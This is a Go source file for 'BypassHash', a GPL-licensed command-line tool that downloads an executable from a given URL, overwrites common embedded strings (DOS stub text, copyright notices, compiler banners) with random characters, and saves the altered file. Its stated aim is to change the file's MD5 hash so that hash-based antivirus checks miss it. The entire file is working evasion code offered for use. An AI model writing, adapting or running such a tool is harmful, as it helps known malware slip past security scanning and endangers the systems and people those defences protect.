/*
    This tool downloads an executable and bypasses hash-based virus checks
    Copyright (C) 2022  Maurice Lambert

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/


// This project downloads an executable/compiled
// file and modifies its contents before writing
// it to disk to bypass antivirus hash checks.

package main

import (
	"container/list"
	"crypto/md5"
	"math/rand"
	"net/http"
	"bytes"
	"time"
	"fmt"
	"os"
	"io"
)

const ASCII = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ():._-"
const ASCII_LENGTH = len(ASCII)
const BUFFER_SIZE = 32 * 1024

var strings = list.New()

// The "main" function analyzes the command line arguments,
// defines predefined strings often present in executables,
// calls the download function and exits.
func main() {
	fmt.Println(`
BypassHash  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
`)

	if len(os.Args) != 3 {
		fmt.Println("USAGES: BypassHash <url> <filename>")
		os.Exit(1)
	}

	strings.PushFront([]byte("This program cannot be run in DOS mode."))
	strings.PushFront([]byte("License"))
	strings.PushFront([]byte("USAGE"))
	strings.PushFront([]byte("Usage"))
	strings.PushFront([]byte("usage"))
	strings.PushFront([]byte("GNU GPL version 3"))
	strings.PushFront([]byte("Copyright"))
	strings.PushFront([]byte("copyright"))
	strings.PushFront([]byte("COPYRIGHT"))
	strings.PushFront([]byte("GCC: "))
	strings.PushFront([]byte("(Debian "))
	strings.PushFront([]byte("(Red Hat "))
	strings.PushFront([]byte(" (GNU) "))
	strings.PushFront([]byte("(MinGW.org "))
	strings.PushFront([]byte("(x86_64-posix"))
	strings.PushFront([]byte(" by "))
	strings.PushFront([]byte(" Built "))

	url := os.Args[1]
	filename := os.Args[2]
	old_hash, new_hash := download(url, filename)

	fmt.Printf("Old MD5: %x\n", old_hash)
	fmt.Printf("New MD5: %x", new_hash)

	os.Exit(0)
}


// "get_random_executable_content" function changes predefined
// strings to random bytes if present
func get_random_executable_content(data []byte, last_index int) []byte {
	rand.Seed(time.Now().UnixNano())

	for element := strings.Front(); element != nil; element = element.Next() {
		word := element.Value.([]byte)

		if bytes.Contains(data[0:last_index], word) {
			// fmt.Printf("[+] Found: %s\n", word)
			length := len(word)
			random := make([]byte, length)

			for i := 0; i < length; i++ {
				random[i] = ASCII[rand.Intn(ASCII_LENGTH)]
			}

			data = bytes.Replace(data[0:last_index], word, random[0:length], -1)
		}
	}

    return data
}

// the "download" function downloads an executable
// and writes it to a file after modifying with the
// "get_random_executable_content" function
// This function calculates the hash of the real
// file and the random file to print them.
func download(url string, filepath string) ([]byte, []byte) {
	outfile, err := os.Create(filepath)
	if err != nil {panic(err)}
	defer outfile.Close()

	response, err := http.Get(url)
	if err != nil {panic(err)}
	defer response.Body.Close()

	old_hash := md5.New()
	new_hash := md5.New()

	var buffer = make([]byte, BUFFER_SIZE)
	var data = make([]byte, BUFFER_SIZE)

	for {
		last_index, err := response.Body.Read(buffer)

		if last_index > 0 {
			if _, err := old_hash.Write(buffer[0:last_index]); err != nil {panic(err)}

			data = get_random_executable_content(buffer, last_index)
			outfile.Write(data[0:last_index])
			new_hash.Write(data[0:last_index])
		}

		if err != nil {
			if err != io.EOF {panic(err)}
			break
		}
	}

	return old_hash.Sum(nil), new_hash.Sum(nil)
}